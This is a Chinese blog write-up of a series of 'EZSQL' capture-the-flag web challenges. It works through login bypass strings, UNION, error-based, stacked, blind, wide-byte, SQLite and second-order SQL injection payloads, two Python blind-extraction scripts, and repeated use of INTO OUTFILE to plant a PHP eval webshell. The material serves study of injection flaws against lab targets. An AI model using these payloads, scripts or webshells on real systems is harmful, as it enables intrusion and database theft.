---
title: 青岑CTF有关WEB的WP（二）
description: 青岑CTF有关EZSQL的WP。
date: 2026-04-23 12:48:38
updated: 2026-04-23 12:48:38
image: https://img.yanxisishi.top/images/2026/04/ae30f83d66cf8d940375a9f41efc3333.png
categories: [CTF]
tags: [CTF, WP]
---

## EZSQL(万能密码)

万能密码过了就给 flag 

**Username：**`' or 1 = 1 -- ` （注意 `--` 后面还要接一个空白符号，一般用空格，不要用换行）
**Password：**`随意`

或者

**Username：**`admin' -- ` 
**Password：**`随意`

或者

**Username：**`随意` 
**Password：**`' or 1 = 1 #`

其中 `-- ` 和 `#` 的作用都是行注释。

接下来为了更好理解本题sql注入逻辑，尝试往里面注入一句话木马：

前提：数据库用户需要 FILE 权限、目标目录可写、secure_file_priv 允许。

1. 测试列数：

   **Username：**`' or 1 = 1 order by 1#` 
   **Password：**`随意`

   回显 flag 。

   **Username：**`' or 1 = 1 order by 2#` 
   **Password：**`随意`

   回显 flag 。

   **Username：**`' or 1 = 1 order by 3#` 
   **Password：**`随意`

   回显  Login failed. 。

   说明列数为 2 。

   也可以把 `' or 1 = 1 order by 1#` 改成 `admin' order by 1#` ，因为 admin 这个账号是确实存在的，只需要保证去掉 `order by 1` 后的 payload 恒为真就行，所以可以保证报错的原因是列数不对。

2. 注入一句话木马：

   **Username：**`' union select 1,"<?php @eval($_POST[1]);?>" into outfile '/var/www/html/1.php' -- ` 
   **Password：**`随意`

   接着访问 `/1.php` ，可以正常回显一个 `1` 的页面，就说明成功了。

3. 连接 Antsword：

   添加数据， URL 填 `http://docker.qingcen.net:43376/1.php` ，密码填 `1` 。

   拿到源码 `index.php` ：

   ```php
   <?php
   session_start();
   
   $host = "localhost";
   $username = "root";
   $password = "root";
   $dbname = "user";
   
   $conn = new mysqli($host, $username, $password, $dbname);
   
   if ($conn->connect_error) {
       die("Database connection failed");
   }
   
   $flag = getenv('FLAG');
   $login_msg = '';
   
   if (isset($_GET['username']) && isset($_GET['password'])) {
       $user = $_GET['username'];
       $pass = $_GET['password'];
       
       $sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
       
       $result = $conn->query($sql);
       
       if ($result && $result->num_rows > 0) {
           $row = $result->fetch_assoc();
           $login_msg = '<div class="alert alert-success">' . htmlspecialchars($flag) . '</div>';
       } else {
           $login_msg = '<div class="alert alert-danger">Login failed.</div>';
       }
   }
   ?>
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Login</title>
       <style>
           * {
               margin: 0;
               padding: 0;
               box-sizing: border-box;
           }
           
           body {
               font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
               background: #0a0e27;
               background-image: 
                   radial-gradient(circle at 20% 50%, rgba(120, 119, 198, 0.1) 0%, transparent 50%),
                   radial-gradient(circle at 80% 80%, rgba(255, 119, 198, 0.1) 0%, transparent 50%),
                   radial-gradient(circle at 40% 20%, rgba(120, 219, 255, 0.1) 0%, transparent 50%);
               min-height: 100vh;
               display: flex;
               justify-content: center;
               align-items: center;
               padding: 20px;
               color: #e0e0e0;
           }
           
           .login-container {
               background: rgba(18, 22, 40, 0.95);
               backdrop-filter: blur(20px);
               padding: 50px 40px;
               border-radius: 20px;
               border: 1px solid rgba(255, 255, 255, 0.1);
               box-shadow: 
                   0 20px 60px rgba(0, 0, 0, 0.5),
                   inset 0 1px 0 rgba(255, 255, 255, 0.1);
               width: 100%;
               max-width: 420px;
               position: relative;
           }
           
           .login-container::before {
               content: '';
               position: absolute;
               top: 0;
               left: 0;
               right: 0;
               height: 2px;
               background: linear-gradient(90deg, transparent, rgba(120, 119, 198, 0.5), transparent);
           }
           
           h1 {
               text-align: center;
               color: #ffffff;
               margin-bottom: 40px;
               font-size: 32px;
               font-weight: 300;
               letter-spacing: 2px;
               text-transform: uppercase;
           }
           
           .form-group {
               margin-bottom: 25px;
           }
           
           label {
               display: block;
               margin-bottom: 10px;
               color: #b0b0b0;
               font-size: 14px;
               font-weight: 500;
               text-transform: uppercase;
               letter-spacing: 1px;
           }
           
           input[type="text"],
           input[type="password"] {
               width: 100%;
               padding: 14px 18px;
               background: rgba(255, 255, 255, 0.05);
               border: 1px solid rgba(255, 255, 255, 0.1);
               border-radius: 10px;
               font-size: 15px;
               color: #ffffff;
               transition: all 0.3s ease;
           }
           
           input[type="text"]:focus,
           input[type="password"]:focus {
               outline: none;
               background: rgba(255, 255, 255, 0.08);
               border-color: rgba(120, 119, 198, 0.5);
               box-shadow: 0 0 0 3px rgba(120, 119, 198, 0.1);
           }
           
           input[type="text"]::placeholder,
           input[type="password"]::placeholder {
               color: rgba(255, 255, 255, 0.3);
           }
           
           button {
               width: 100%;
               padding: 14px;
               background: linear-gradient(135deg, #7877c6 0%, #ff77c6 100%);
               color: #ffffff;
               border: none;
               border-radius: 10px;
               font-size: 16px;
               font-weight: 600;
               cursor: pointer;
               transition: all 0.3s ease;
               text-transform: uppercase;
               letter-spacing: 1px;
               margin-top: 10px;
           }
           
           button:hover {
               transform: translateY(-2px);
               box-shadow: 0 10px 30px rgba(120, 119, 198, 0.4);
           }
           
           button:active {
               transform: translateY(0);
           }
           
           .alert {
               padding: 18px 20px;
               border-radius: 10px;
               margin-bottom: 25px;
               border: 1px solid;
           }
           
           .alert-danger {
               background: rgba(220, 53, 69, 0.1);
               color: #ff6b7a;
               border-color: rgba(220, 53, 69, 0.3);
           }
           
           .alert-success {
               background: rgba(40, 167, 69, 0.1);
               color: #4ade80;
               border-color: rgba(40, 167, 69, 0.3);
               font-size: 16px;
               font-weight: 600;
               font-family: 'Courier New', monospace;
           }
       </style>
   </head>
   <body>
       <div class="login-container">
           <h1>Login</h1>
           
           <?php if ($login_msg): ?>
               <?php echo $login_msg; ?>
           <?php endif; ?>
           
           <form method="GET" action="">
               <div class="form-group">
                   <label for="username">Username</label>
                   <input type="text" id="username" name="username" required autofocus placeholder="Enter username">
               </div>
               
               <div class="form-group">
                   <label for="password">Password</label>
                   <input type="password" id="password" name="password" required placeholder="Enter password">
               </div>
               
               <button type="submit">Login</button>
           </form>
       </div>
   </body>
   </html>
   ```

   根据源码中的 `$flag = getenv('FLAG');` 可以得知，flag 放在环境变量中，可以在蚁剑的虚拟终端中输入 `env` 命令得到 flag 。

4. 连接数据库：

   右键刚刚新添加的数据，选择数据操作，点击添加，数据库类型选择 `MYSQLI` ，连接密码填 `root` ：

   ![image-20260422141053261](https://img.yanxisishi.top/images/2026/04/image-20260422141053261.png)

   添加成功后，双击左边新添加的`mysqli://root@localhost:3306` 节点。

   在 `user` 库中找到 `users` 表，执行右上角的 SQL 语句，拿到本题唯一的用户密码：

   ![image-20260422142140723](https://img.yanxisishi.top/images/2026/04/image-20260422142140723.png)

   所以输入：

   **Username：**`admin` 
   **Password：**`a1545de57b740fcbed419823cb38b800db46f905`

   也可以得到 flag 。

回归正题，拿到源码是为了更好理解 sql 注入实现逻辑，关键代码在：

```php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $user = $_GET['username'];
    $pass = $_GET['password'];
    
    $sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
```

关于解法：

1. **Username：**`admin` 
   **Password：**`a1545de57b740fcbed419823cb38b800db46f905`

   没什么好说，毕竟是真密码。

2. **Username：**`' or 1 = 1 #` 
   **Password：**`随意`

   拼接后：

   ```sql
   SELECT * FROM users WHERE username = '' or 1 = 1 #' AND password = '...'
   ```

   单引号闭合前面的字符串，`or 1 = 1` 制造恒真条件，`#` 直接把后半截的密码验证逻辑注释掉，导致整个 WHERE 条件恒为真。

3. **Username：**`随意` 
   **Password：**`' or 1 = 1 #`

   拼接后：

   ```sql
   SELECT * FROM users WHERE username = '...' AND password = '' or 1 = 1 #'
   ```

   也是利用恒真条件。因为在 SQL 中 `AND` 的优先级高于 `OR`，所以实际执行逻辑是 `(username = '...' AND password = '') OR (1 = 1)`。整体结果依然恒定为真，`#` 只是为了吃掉源码结尾的最后一个单引号防止报错。

4. **Username：**`随意` 
   **Password：**`' or 1 = '1`

   拼接后：

   ```sql
   SELECT * FROM users WHERE username = '...' AND password = '' or 1 = '1'
   ```

   不使用注释符（`#` 或 `-- `）的闭合手法。填入的 `'1` 刚好与源码最后自带的那个单引号完美结合，构成了 `1 = '1'`。在 MySQL 中隐式转换下 `1 = '1'` 为真，整体 WHERE 依然等效于 `... OR True`。

   但是不要输入：

   **Username：**`' or 1 = '1` 
   **Password：**`随意`

   拼接后：

   ```sql
   SELECT * FROM users WHERE username = '' or 1 = '1' AND password = '...'
   ```

   在 SQL 中，`AND` 的优先级高于 `OR`。因此上述语句的实际执行逻辑会被解析为： `(username = '') OR (1 = '1' AND password = '...')` 。

   因为随便输入的密码是错的，所以右边 `AND` 的整体结果为假（False）。左边用户名也不匹配，最终变成 `False OR False`，导致登录失败。
   
5. **Username：**`'='` 
   **Password：**`'='`

   拼接后：

   ```sql
   SELECT * FROM users WHERE username = ''='' AND password = ''=''
   ```

   MySQL 连续等号从左到右计算，且空字符串在与数字比较时会隐式转换为 0。

   实际等效逻辑与运算过程如下：
   
   `((username = '') = '') AND ((password = '') = '')`
   
   => 假设真实用户名和密码均不为空字符串，第一步比较 `username = ''` 和 `password = ''` 的结果均为假（0）
   
   => `(0 = '') AND (0 = '')`
   
   => MySQL 将空字符串隐式转换为数字 0
   
   => `(0 = 0) AND (0 = 0)`
   
   => `1 AND 1`
   
   => 整体结果为真 (True)，成功绕过。

## EZSQL_1(Union联合查询注入)

输入：

**Username：**`' or 1 = 1 -- ` 
**Password：**`随意`

只返回了 Welcome admin ，看来 flag 在这题是被安排到了数据库里面。

先尝试 **Union 联合查询注入** ：

1. 测列数：

   **Username：**`' or 1 = 1 order by 4#` 
   **Password：**`随意`

   回显 Welcome admin 。

   **Username：**`' or 1 = 1 order by 5#` 
   **Password：**`随意`

   回显  Login failed. 。

   说明列数为 4 。

2. 找回显位：

   **Username：**`' UNION SELECT 1,2,3,4#` 
   **Password：**`随意`

   回显 Welcome 2 ，因此 2 所在列数是回显位。

   **注意：** 去掉 Union 后的原语句不能为真，因为本题只会回显查询后得到的第一条数据。

3. 爆库名：

   **Username：**`' UNION SELECT 1,database(),3,4#` 
   **Password：**`随意`

   回显 Welcome user ，说明当前库名是 user 。

4. 爆表名：

   **Username：**`' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()#` 
   **Password：**`随意`

   回显 Welcome flag ，说明只有一个表 flag 。

5. 爆列名：

   **Username：**`' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='flag'#` 
   **Password：**`随意`

   回显 Welcome id,name,passwd,secret ，说明有这 4 列。

6. 爆数据：

   **Username：**`' UNION SELECT 1,group_concat(id,name,passwd,secret),3,4 FROM flag#` 
   **Password：**`随意`

   回显 Welcome 1adminadmin123flag{273cca3c-e19f-4273-83e3-59b60980e10a}

当然本题像上题那样塞一句马进去也是完全可以的，甚至更快点。

## EZSQL_2(过滤空格)

输入：

**Username：**`' or 1 = 1 -- ` 
**Password：**`随意`

返回 Illegal SQL injection ，测试后发现只是过滤了空格，可以用三种方法绕过：

1. 内联注释替代：

   直接用内联注释 `/**/` 替代空格，但是注意不能替代 `-- ` 中的空格。 

   **Username：**`'UNION/**/SELECT/**/1,group_concat(id,name,passwd,secret),3,4/**/FROM/**/flag#` 
   **Password：**`随意`

2. 括号包裹替代：

   利用函数或子查询自带的括号隔离关键字。

   **Username：**`'UNION(SELECT(1),group_concat(id,name,passwd,secret),(3),(4)FROM(flag))#` 
   **Password：**`随意`

3. URL 编码字符替代：

   `%09` (Tab)、`%0b` (垂直制表符)、`%0c` (换页)、`%0a` (换行)。

   这些都可以用来替代空格，但注意不要用 `%0a` 来替代 `-- ` 中的空格，因为 `-- ` 是行注释，使用 `%0a` 换行符会导致后面的数据根本没有被注释。 

   **Username：**`'UNION%0cSELECT%0c1,group_concat(id,name,passwd,secret),3,4%0cFROM%0cflag--%0c` 
   **Password：**`随意`

   这种 URL 编码的记得用 bp 或者 hackbar 发送，不要用网页输入框。

## EZSQL_3(双写绕过)

输入：

**Username：**`' or 1 = 1 -- ` 
**Password：**`随意`

返回 `非法sql` ，经测试发现还是过滤了空格。

但是输入上题 payload ：

**Username：**`'UNION/**/SELECT/**/1,group_concat(id,name,passwd,secret),3,4/**/FROM/**/flag#` 
**Password：**`随意`

发现返回报错信息：

```txt
SQL Error: SELECT * FROM flag WHERE name = ''/**//**/1,group_concat(id,name,passwd,secret),3,4/**//**/#' AND passwd = '1'
```

说明 `union select from flag` 都被删掉了（被替换成了空字符串），用双写绕过即可：

**Username：**`'UNUNIONION/**/SELSELECTECT/**/1,group_concat(id,name,passwd,secret),3,4/**/FRFROMOM/**/flflagag#` 
**Password：**`随意`

## EZSQL_4(报错注入)

先尝试万能密码 `'or 1=1#`

查询成功，但是没有 flag ，猜测 flag 不在当前库或表中，使用 Union 联合查询注入：

1. 测列数：

   `'or 1=1 order by 4#` 

   查询成功。

   `'or 1=1 order by 5#` 

   回显报错信息。

   说明列数为 4 。

但此时看到报错信息，意识到此题极有可能可以用报错注入解决：

1. 爆库名：

   `'AND updatexml(1,concat(0x7e,database(),0x7e),1)#`

   回显：

   ```txt
   SQL Error: XPATH syntax error: '~user~'
   ```

   证明了报错注入的可行性，也说明当前库名是 user 。

2. 爆表名：

   `'AND updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#`

   回显：

   ```txt
   SQL Error: XPATH syntax error: '~employees,flag~'
   ```

   说明确实存在另一个表 flag

3. 爆列名：

   `'AND updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag'),0x7e),1)#`

   回显：

   ```txt
   SQL Error: XPATH syntax error: '~id,flag~'
   ```

4. 爆数据：

   `'AND updatexml(1,concat(0x7e,(select group_concat(id,flag) from flag),0x7e),1)#`

   不过其实爆 flag 列的数据就行了。

   `'AND updatexml(1,concat(0x7e,(select flag from flag),0x7e),1)#`

   回显：

   ```txt
   SQL Error: XPATH syntax error: '~flag{90666eea-773e-43fb-8f7c...'
   ```

   由于 updatexml 报错内容会截断，所以需要分段取：

   `'AND updatexml(1,concat(0x7e,(select substr(flag,1,16) from flag limit 0,1),0x7e),1)#`

   `'AND updatexml(1,concat(0x7e,(select substr(flag,17,16) from flag limit 0,1),0x7e),1)#`

   `'AND updatexml(1,concat(0x7e,(select substr(flag,33,16) from flag limit 0,1),0x7e),1)#`

   三个 payload 拼接出来 flag 。

## EZSQL_5(堆叠注入)

尝试上题的 payload ：

`'AND updatexml(1,concat(0x7e,(se/**/lect flag from flag),0x7e),1)#`

返回 Illegal SQL injection ，经测试发现是过滤了 select ，优先尝试堆叠注入：

根据上题知道有两个表 employees 和 flag ，首先把 employees 重命名为 employees_bak ，然后把 flag 重命名为 employees，这样后端查询时实际是在有 flag 的表里面查询。

`'; rename table employees to employees_bak; rename table flag to employees;`

接着再用万能密码  `'or 1=1#` 得到表中所有结果。

## EZSQL_6(布尔盲注)

又变成账号密码登录了，先尝试 Union 联合查询注入 ：

1. 测列数：

   **Username：**`' or 1 = 1 order by 3#` 
   **Password：**`随意`

   回显 Login successful. 。

   **Username：**`' or 1 = 1 order by 4#` 
   **Password：**`随意`

   返回：

   ```txt
   SQL Error: Unknown column '4' in 'order clause'
   ```

   说明列数为 3 。

2. 找回显位：

   **Username：**`' UNION SELECT 1,2,3#` 
   **Password：**`随意`

   回显 Login successful. ，似乎没有回显位，Union 联合查询注入失效。

既然没有回显位，那可能是盲注了，由于存在不同的回显结果，优先尝试布尔盲注：

1. 判断布尔盲注可行性：

   **Username：**`' OR substr((SELECT database()),1,1)='u'#` 
   **Password：**`随意`

   回显 Login successful. 。

   **Username：**`' OR substr((SELECT database()),1,1)='a'#` 
   **Password：**`随意`

   回显 Login failed. 。

   证明布尔盲注是完全可行的。

2. bp 集群炸弹攻击：

   输入

   **Username：**`' OR substr((SELECT database()),1,1)='u'#` 
   **Password：**`随意`

   同时进行抓包，发送至 Intruder，模式选择集群炸弹攻击，接着为 payload 中的第一个 `1` 和 `u` 添加 payload 位置。

   第一个payload发送 `1-50`，

   第二个payload发送 `0-9`、`a-z`、`-`、`{`、`}`、`,` 。

   ![image-20260422211456299](https://img.yanxisishi.top/images/2026/04/image-20260422211456299.png)

   ![image-20260422211638893](https://img.yanxisishi.top/images/2026/04/image-20260422211638893.png)

   接着进入设置，找到 `检索 - 匹配` ，清空原来的，添加 `Login successful.` 。

   ![image-20260422211753425](https://img.yanxisishi.top/images/2026/04/image-20260422211753425.png)

   然后是资源池，可选，觉得慢可以增大线程，我选的 30 。

   最后开始攻击 ，攻击结束后点列表上方的 `Login successful.` 是其按出现次数从大到小排序：

   ![image-20260422212044086](https://img.yanxisishi.top/images/2026/04/image-20260422212044086.png)

   排序得出库名为 user 。

   或者说更方便的，点击该界面上面的第二个灰条 `视图过滤：` ，在 `按搜索字词过滤` 中输入 `Login successful.`  ，然后点击应用，这样就只剩下符合的请求了。

   ![image-20260422213636930](https://img.yanxisishi.top/images/2026/04/image-20260422213636930.png)

   接着再点击列表上排的 Payload1 ，使其从小到大排序，这样就可以从上到下更方便的读取自己需要的数据了。

   ![image-20260422213201611](https://img.yanxisishi.top/images/2026/04/image-20260422213201611.png)

3. 按上面的步骤爆表名、爆列名、爆数据，但是可能要改 payload 范围。

或者说更常规地写布尔盲注脚本：

```python
import requests
import time

url = "http://docker.qingcen.net:43697/" 
result = ""

for i in range(1, 100):
    low = 32
    high = 127
    
    while low < high:
        mid = (low + high) // 2
        
        # 1. 爆库名
        payload = f"' OR ascii(substr((SELECT database()),{i},1))>{mid}#"
        # 2. 爆表名
        # payload = f"' OR ascii(substr((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),{i},1))>{mid}#"
        # 3. 爆列名
        # payload = f"' OR ascii(substr((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='flag'),{i},1))>{mid}#"
        # 4. 爆数据
        # payload = f"' OR ascii(substr((SELECT group_concat(id,name,passwd,secret) FROM flag),{i},1))>{mid}#"
        
        params = {"username": payload, "password": "1"}
        
        try:
            res = requests.get(url, params=params)
            if "Login successful." in res.text:
                low = mid + 1
            else:
                high = mid
        except:
            time.sleep(1)
            continue
            
    if low <= 32:
        break
        
    result += chr(low)
    print(chr(low), end="", flush=True)
```


但是盲注好麻烦啊，耗时耗力的，主播主播有没有什么更简单的方法嘛，有的兄弟有的 —— 依旧注入一句话木马：

输入：

**Username：**`' union select 1,"<?php @eval($_POST[1]);?>",3 into outfile '/var/www/html/1.php'#` 
**Password：**`随意`

访问 `/1.php` 回显 `1 3` 就说明成了，后续蚁剑连接数据库就行了，不多赘述。库、表、列、值均在下图：

![image-20260422214206386](https://img.yanxisishi.top/images/2026/04/image-20260422214206386.png)

## EZSQL_7(布尔盲注)

测一下列数好了：

**Employee ID：** `'or 1=1 order by 1#` 

返回 `查询成功` 

**Employee ID：** `'or 1=1 order by 2#` 

返回 `未找到员工信息` 

说明只有 1 列。

后面不管输入什么都只有这两种回显，跟人机似的，传马好了（预期解应该是布尔盲注）：

**Employee ID：** `' union select "<?php @eval($_POST[1]);?>" into outfile '/var/www/html/1.php'#`

![image-20260422231214754](https://img.yanxisishi.top/images/2026/04/image-20260422231214754.png)

## EZSQL_8(时间盲注)

 输入啥都没有回显，按理来说是要用时间盲注的，但是有点懒了，接着传马：

`' union select "<?php @eval($_POST[1]);?>" into outfile '/var/www/html/1.php'#`

访问 `/1.php` 是 404 ，说明列数有问题，接着加列数就行了。

`' union select 1,1,1,"<?php @eval($_POST[1]);?>" into outfile '/var/www/html/1.php'#`

直到加到 4 列，成功访问 `/1.php` ，接着蚁剑连数据库就行了。

回归正题，还是用一下时间盲注吧，其实跟布尔盲注步骤差不多：

1. 判断时间盲注可行性：

   **Employee ID：**`' or if(substr((select database()), 1, 1)='u', sleep(5), 0)#` 

   回车后有明显的 5s 延迟。

   **Employee ID：**`' or if(substr((select database()), 1, 1)='a', sleep(5), 0)#` 

   马上得到响应。

   证明时间盲注是完全可行的。

2. bp 集群炸弹攻击：

   输入

   **Employee ID：**`' or if(substr((select database()),1,1)='u', sleep(3), 0)#` 

   同时进行抓包，发送至 Intruder，模式选择集群炸弹攻击，接着为 payload 中的第一个 `1` 和 `u` 添加 payload 位置。

   第一个payload发送 `1-50`，

   第二个payload发送 `0-9`、`a-z`、`-`、`{`、`}`、`,` 。

   攻击完成后点击列表上方的 `接收到响应` ，使其从大到小排列：

   ![image-20260423093737722](https://img.yanxisishi.top/images/2026/04/image-20260423093737722.png)

   发现前面 4 条 payload 的响应时长均在 9000ms 以上，出现 9000ms 的原因是当前查询表中有 3 条数据，而这 4 条 payload 就是所需结果。

   接着按住 shift ，鼠标滑动选中这 4 条 payload ，并右键选择高亮，然后点击该界面上面的第二个灰条 `视图过滤：` ，选中 `仅显示高亮条目` ，点击应用：

   ![image-20260423094353572](https://img.yanxisishi.top/images/2026/04/image-20260423094353572.png)

   接着再点击列表上排的 Payload1 ，使其从小到大排序，这样就可以从上到下更方便的读取自己需要的数据了。

   ![image-20260423094438859](https://img.yanxisishi.top/images/2026/04/image-20260423094438859.png)

   排序得出库名为 user 。

3. 按上面的步骤爆表名、爆列名、爆数据，但是可能要改 payload 范围。

或者说更常规地写时间盲注脚本：

```python
import requests
import time

url = "http://docker.qingcen.net:43704/" 
result = ""

for i in range(1, 100):
    low = 32
    high = 127
    
    while low < high:
        mid = (low + high) // 2
        
        # 1. 爆库名
        payload = f"' OR IF(ascii(substr((SELECT database()),{i},1))>{mid}, sleep(3), 0)#"
        # 2. 爆表名
        # payload = f"' OR IF(ascii(substr((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),{i},1))>{mid}, sleep(3), 0)#"
        # 3. 爆列名
        # payload = f"' OR IF(ascii(substr((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='flag'),{i},1))>{mid}, sleep(3), 0)#"
        # 4. 爆数据
        # payload = f"' OR IF(ascii(substr((SELECT group_concat(flag) FROM flag),{i},1))>{mid}, sleep(3), 0)#"
        
        params = {"id": payload}
        
        try:
            res = requests.get(url, params=params, timeout=5)
            if res.elapsed.total_seconds() > 2.5:
                low = mid + 1
            else:
                high = mid
        except requests.exceptions.Timeout:
            low = mid + 1
        except:
            time.sleep(1)
            continue
            
    if low <= 32:
        break
        
    result += chr(low)
    print(chr(low), end="", flush=True)
```

## EZSQL_9(宽字节注入)

输入：

**Username：**`'or 1=1#` 
**Password：**`随意`

居然返回 Login failed. ，猜测是单引号 `'` 被转义，尝试宽字节注入：

输入（**有 URL 编码的 payload 要用 hackbar 发送**）：

**Username：**`%df'or 1=1-- ` （或者`%df'or 1=1%23` ，不要用 `#` ，浏览器在发送 HTTP 请求时，会自动截断并丢弃 `#` 以及它后面的所有内容）
**Password：**`随意`

返回 Welcome admin ，证明确实存在宽字节注入。

输入：

**Username：**`%df' UNION SELECT 1,group_concat(id,name,passwd,secret),3,4 FROM flag-- ` 
**Password：**`随意`

得到 flag 。

## EZSQL_10(SQLite联合注入)

输入：

**Username：**`'or 1=1#` 
**Password：**`随意`

返回报错信息：

```txt
Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "#" in/var/www/html/index.php on line 38
```

得知本题数据库不是 MySQL ，而是 SQLite，而 SQLite 不支持 `#` 的注释，需要用 `--` （`--` 后面不需要跟空格）。

先尝试 Union 联合查询注入 ：

1. 测列数：

   **Username：**`'or 1=1 order by 4--` 
   **Password：**`随意`

   回显 Welcome admin 。

   **Username：**`'or 1=1 order by 5--` 
   **Password：**`随意`

   回显  Login failed. 。

   说明列数为 4 。

2. 找回显位：

   **Username：**`' UNION SELECT 1,2,3,4--` 
   **Password：**`随意`

   回显 Welcome 2 ，因此 2 所在列数是回显位。

3. 爆表名：

   在 SQLite 注入中，通常不需要、也没法像 MySQL 那样直接爆出库名，所以直接来到爆表名。

   **Username：**`' UNION SELECT 1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type='table'--` 
   **Password：**`随意`

   回显 Welcome flag ，说明只有一个表 flag 。

4. 爆列名：

   **Username：**`' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type='table' AND tbl_name='flag'--` 
   **Password：**`随意`

   回显：

   ```txt
   Welcome CREATE TABLE flag (id INTEGER, name TEXT, passwd TEXT, secret TEXT)
   ```

   说明存在 `id,name,passwd,secret` 这 4 列。

5. 爆数据：

   **注意：** 在 SQLite 中，`group_concat()` 函数最多只能接受 1 个或 2 个参数：

   1. 第一个参数：需要被拼接的字段或字符串。
   2. 第二个参数（可选）：自定义的分隔符（默认是逗号）。

   **Username：**`' UNION SELECT 1,group_concat(id||name||passwd||secret),3,4 FROM flag--` 
   **Password：**`随意`

   或者

   **Username：**`' UNION SELECT 1,group_concat(secret),3,4 FROM flag--` 
   **Password：**`随意`

**注意：** `INTO OUTFILE` 是 MySQL 特有的一项功能，用于将 `SELECT` 查询的结果直接导出为一个系统文件。 **但 SQLite 的解析器不认识这个语法**。

不能用：

**Username：**`' union select 1,1,1,"<?php @eval($_POST[1]);?>" into outfile '/var/www/html/1.php'--` 
**Password：**`随意`

## EZSQL_11(SQLite布尔盲注)

只会返回 `查询成功` 和  `未找到员工信息` ，判断是 SQLite 布尔盲注，编写脚本如下：

```python
import requests
import time

url = "http://docker.qingcen.net:43705/" 
result = ""

for i in range(1, 500):
    low = 32
    high = 127
    
    while low < high:
        mid = (low + high) // 2
        
        # 1. 爆表名 (查 sqlite_master)
        payload = f"' OR unicode(substr((SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'),{i},1))>{mid}--"
        # 2. 爆列名 (获取建表语句 DDL)
        # payload = f"' OR unicode(substr((SELECT sql FROM sqlite_master WHERE type='table' AND tbl_name='flag'),{i},1))>{mid}--"
        # 3. 爆数据 (假设从建表语句中得知列名为 flag)
        # payload = f"' OR unicode(substr((SELECT group_concat(flag) FROM flag),{i},1))>{mid}--"
        
        params = {"id": payload} 
        
        try:
            res = requests.get(url, params=params)
            if "查询成功" in res.text:
                low = mid + 1
            else:
                high = mid
        except:
            time.sleep(1)
            continue
            
    if low <= 32:
        break
        
    result += chr(low)
    print(chr(low), end="", flush=True)
```

## EZSQL_12(二次注入)

给了注册和登录两个界面，大概率是二次注入：

注册界面注册一个 `' or 1=1#` 的账号，密码随意，然后进入登录页面，用刚刚注册的账号密码即可，查看笔记得到 flag 。

以下是后端 PHP 处理逻辑的伪代码（因为拿不到真的）：

```php
# ========== 注册 ==========
function register(reg_username, reg_password):
    sql = "INSERT INTO users(username, password) VALUES(?, ?)"
    db.execute(sql, [reg_username, md5(reg_password)])
    return "注册成功"

# ========== 登录 ==========
function login(login_username, login_password):
    sql = "SELECT id, username FROM users WHERE username=? AND password=?"
    user = db.query_one(sql, [login_username, md5(login_password)])
    if user != null:
        session["username"] = user.username
        return "登录成功"

# ========== 查看笔记（漏洞点） ==========
function view_notes():
    u = session["username"]          # 这里取到的是“之前存进库的用户名”
    sql = "SELECT note_content FROM notes WHERE username='" + u + "' LIMIT 1"
    # 把存储值直接拼接进 SQL，导致二次注入
    note = db.query_one(sql)
    return note
```

## EZSQL_13(二次注入+其他方式注入)

注册一个 `' or 1=1#` 的账号，密码随意，然后进入登录页面，查看我的笔记，回显：

```txt
Welcome admin. Your secret note is empty.
```

说明表不在这里，不能直接用万能密码做，先尝试 Union联合查询注入：

1. 测列数：

   注册一个 `' ORDER BY 2#` 的账号，密码随意，然后进入登录页面，查看我的笔记，显示 `您还没有私密笔记。` 。

   注册一个 `' ORDER BY 3#` 的账号，密码随意，然后进入登录页面，查看我的笔记，显示 `查询异常：Unknown column &#039;3&#039; in &#039;ORDER BY&#039;` 。

   说明列数为 2 。

2. 找回显位：

   注册一个 `' UNION SELECT 1,2#` 的账号，密码随意，然后进入登录页面，查看我的笔记，显示 `2 `。

   因此 2 所在列数是回显位。

3. 爆库名：

   注册一个 `' UNION SELECT 1,database()#` 的账号，密码随意，然后进入登录页面，查看我的笔记，显示 `user` 。

   说明当前库名是 user 。

4. 爆表名：

   注册一个 `' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#` 的账号，密码随意，然后进入登录页面，查看我的笔记，显示 `user_notes,users,flags` 。

   说明有 3 个表 `user_notes,users,flags` 。

5. 爆列名：

   注册一个 `' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='flags'#` 的账号，密码随意，然后进入登录页面，查看我的笔记，显示 `flag` 。

   说明只有 1 列 `flag` 。

6. 爆数据：

   注册一个 `' UNION SELECT 1,group_concat(flag) FROM flags#` 的账号，密码随意，然后进入登录页面，查看我的笔记，显示 `flag{d638f4f3-3cb0-43ee-be79-9e8f92cbe546}` 。

当然这题除了 Union联合查询注入，也完全可以用二次注入联合其他方式，比如报错注入、盲注。
